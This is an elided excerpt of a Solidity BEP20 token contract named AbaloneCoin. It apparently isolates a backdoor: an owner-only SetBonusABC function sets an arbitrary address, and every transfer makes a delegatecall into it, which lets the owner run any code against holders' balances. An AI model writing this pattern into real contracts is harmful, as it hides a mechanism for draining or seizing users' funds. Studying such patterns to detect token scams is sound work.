...
contract AbaloneCoin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'AbaloneCoin';
  ...
  */
  ...
  function claimDividendABC(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_ABC.delegatecall(
  ...
  function SetBonusABC(address c) public onlyOwner {
    C_ABC = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendABC(sender, recipient, amount);   
